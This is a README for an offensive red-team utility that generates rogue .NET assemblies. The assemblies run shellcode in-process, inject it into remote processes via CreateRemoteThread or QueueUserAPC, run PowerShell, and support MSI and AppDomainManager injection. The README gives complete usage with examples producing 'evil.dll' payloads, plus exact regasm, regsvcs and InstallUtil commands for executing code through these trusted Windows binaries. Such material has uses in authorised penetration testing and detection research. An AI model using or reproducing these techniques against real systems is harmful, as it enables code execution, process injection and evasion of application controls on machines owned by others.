## Rogue .NET Assembly for Regsvcs/Regasm/InstallUtil Code Execution

This script produces C# code that can:

- run system command
- run shellcode in-process
- inject shellcode and execute with `CreateRemoteThread`
- inject shellcode and execute with `QueueUserAPC`
- run Powershell through a managed runspace
- a DLL that can be loaded with `regsvcs`, `regasm`, `installutil` LOLBINs

It **doesnt** incorporate any of the following:

- [D/Invoke](https://github.com/TheWover/DInvoke)
- [H/Invoke](https://gist.github.com/dr4k0nia/95bd2dc1cc09726f4aaaf920b9982f9d)
- Direct/Indirect syscalls

All Win32 APIs are imported with [P/Invoke](https://github.com/dotnet/pinvoke).

Produced .NET assemblies can also be used to:

- run .NET code from MSI context (use `-M` flag)
- run .NET code as part of injected [AppDomainManager](https://github.com/TheWover/GhostLoader) (use `-A` flag)


### Usage

Included in this directory script is a helper utility allowing one to quickly generate desired csharp source code file to be used for further `csc` compilation.

Usage:

```
    :: Rogue .NET Source Code Generation Utility ::
    Comes with a few hardcoded C# code templates and an easy wrapper around csc.exe compiler
    Mariusz Banach / mgeeky, <mb@binary-offensive.com>, '19-23

usage: .\generateRogueDotNet.py [options] <inputFile|cmdline>

positional arguments:
  inputFile             Input file to embedded into C# source code for --type regasm|plain. If --type exec was given, this parameter specifies command line to execute by the resulting assembly (environment variables will get expanded). May be either Powershell script, raw binary Shellcode or .NET Assembly (PE/EXE) file.

options:
  -h, --help            show this help message and exit
  -t {regasm,plain,exec,run-command}, --type {regasm,plain,exec,run-command}
                        Specifies type of payload to generate. "plain" - assembly with embedded shellcode/ps1/exe, "exec" - assembly that hardcodes supplied shell command in "inputFile|cmdline" parameter and then runs it, "run-command" exposes a method named --method which takes one string parameter being a command to run, "regasm" - produces
                        executable compatible with Regasm/Regsvcs/InstallUtil code execution primitives. Default: plain
  -c {default,x86,x64}, --compile {default,x86,x64}
                        Compile the source code using x86 or x64 csc.exe and generate output EXE/DLL file depending on --output extension. Default: default - CPU independent executable will be produced.
  -o PATH, --output PATH
                        Output path where to write produced assembly/C# code. Default: print resulting C# code to stdout
  -s NAME, --namespace NAME
                        Specifies custom C# module namespace for the generated Task (for needs of shellcode loaders such as DotNetToJScript or Donut). Default: ProgramNamespace.
  -n NAME, --module NAME
                        Specifies custom C# module name for the generated Task (for needs of shellcode loaders such as DotNetToJScript or Donut). Default: Program.
  -m NAME, --method NAME
                        Specifies method name that could be used by DotNetToJS and alike deserialization techniques to invoke our shellcode. Default: Foo
  -e, --exe             Specified input file is an Mono/.Net assembly PE/EXE. WARNING: Launching EXE is currently possible ONLY WITH MONO/.NET assembly EXE/DLL files, not an ordinary native PE/EXE!
  -r, --raw             (OBSOLETED) Specified input file is a raw Shellcode to be injected in self process in a separate Thread (VirtualAlloc + CreateThread)
  -M, --msi-mode        Compiled .NET assembly is to be used with MSI installer
  -A, --appdomainmanager-mode
                        Defines additional public sealed class inheriting from AppDomainManager with name: "MyAppDomainManager". Useful for side-loading .NET applications through the AppDomainManager Injection attack (google up: TheWover/GhostLoader)
  -C PARAMS, --extra-params PARAMS
                        Additional parameters to add to CSC compiler
  --dotnet-ver {v2,v4,2,4}
                        Use specific .NET version for compilation (with --compile given). Default: v2
  --queue-apc           If --raw was specified, generate C# code template with CreateProcess + WriteProcessMemory + QueueUserAPC process injection technique instead of default CreateThread.
  --target-process PATH
                        This option specifies target process path for remote process injection in --queue-apc technique. May use environment variables. May also contain command line for spawned process, example: --target-process "%windir%\system32\werfault.exe -l -u 1234"

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
USE CASES:

1) Generate .NET EXE assembly that injects shellcode into remote process and runs via QueueUserAPC:
    cmd> py generateRogueDotNet.py calc64.bin -o evil.exe --queue-apc

2) Generate .NET DLL assembly that executes shellcode inline/in-process
    cmd> py generateRogueDotNet.py calc64.bin -o evil.dll

3) Generate .NET v4 DLL assembly that executes shellcode in-process and will be used for building evil MSI:
    cmd> py generateRogueDotNet.py calc64.bin -o evil.dll --dotnet-ver v4 -M

4) Run Powershell through a managed runspace:
    cmd> py generateRogueDotNet.py evil.ps1 -o evil.exe --dotnet-ver v4

5) Generate .NET DLL assembly that runs shellcode and can be loaded with Regasm/Regsvcs/InstallUtil LOLBINs:
    cmd> py generateRogueDotNet.py calc64.bin -o evil.dll -t regasm

5) Generate .NET assembly that executes hardcoded system command (calc.exe):
    cmd> py generateRogueDotNet.py -o evil.dll -t exec calc.exe

6) Generate .NET v4 DLL assembly that executes shellcode in-process and will be used for AppDomainManager injection (aka TheWover/GhostLoader):
    cmd> py generateRogueDotNet.py calc64.bin -o evil.dll --dotnet-ver v4 -A

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```


### Regsvcs, Regasm or InstallUtil execution:

- x86:
```
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regasm.exe rogue.dll
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U rogue.dll

%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe rogue.dll
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U rogue.dll 

%WINDIR%\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
```

- x64:
```
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe rogue.dll
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U rogue.dll

%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe rogue.dll
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U rogue.dll 

%WINDIR%\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
```

